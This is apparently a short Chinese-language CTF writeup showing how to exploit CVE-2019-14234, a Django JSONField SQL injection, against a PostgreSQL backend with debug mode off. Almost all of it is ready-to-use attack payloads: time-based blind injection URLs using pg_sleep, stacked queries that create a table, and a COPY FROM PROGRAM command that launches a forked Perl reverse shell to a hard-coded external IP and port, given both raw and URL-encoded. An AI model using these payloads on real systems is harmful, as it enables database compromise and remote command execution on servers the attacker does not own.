# Writeup

难点：

1. 关闭debug下JSONField利用 （30分钟）

2. postgres Copy From 的利用
   1. postgres不同版本下的转义（15分钟）
   2. postgres copy from方式执行反弹shell需要fork（20分钟）









CVE-2019-14234 Django JSONField SQL注入

关闭debug，需要用延时来判断注入点，debug为false的JSONField SQL注入网上并没有几篇文章讲黑盒情况下如何利用

```
http://127.0.0.1:8000/app/details?profile__username%27)%3d%271%27+or+1%3d1+%3bSELECT+CASE+WHEN+1%3E2+THEN+%27a%27+ELSE+pg_sleep(1)+END--+
```

postgres9.6-11.2版本之间的 COPY FROM来getshell

不能直接反弹shell，需要fork一个子进程，需要注意postgres在高版本下的转义方式

DROP TABLE IF EXISTS cmd_exec;

```
http://192.168.137.249:8000/app/details?profile__username')%3d'1'+or+1%3d1+%3bDROP+TABLE+IF+EXISTS+cmd_exec%3b--+--+
```

CREATE TABLE cmd_exec(cmd_output text);

```
http://192.168.137.249:8000/app/details?profile__username%27)%3d'1'+or+1%3d1+%3bCREATE+TABLE+cmd_exec(cmd_output+text)%3b--+--+
```

postgres在9版本以后不能直接转义，要加E

```
Copy cmd_exec From Program E'perl -e \'$p=fork;exit,if($p);use Socket;$i="39.108.82.21";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'';
```



```
http://127.0.0.1:8000/app/details?profile__username%27)%3d%271%27+or+1%3d1+%3bCopy%20cmd_exec%20From%20Program%20E%27perl%20-e%20%5C%27%24p%3Dfork%3Bexit%2Cif(%24p)%3Buse%20Socket%3B%24i%3D%2239.108.82.21%22%3B%24p%3D8888%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%5C%27%27%3B--+--+
```

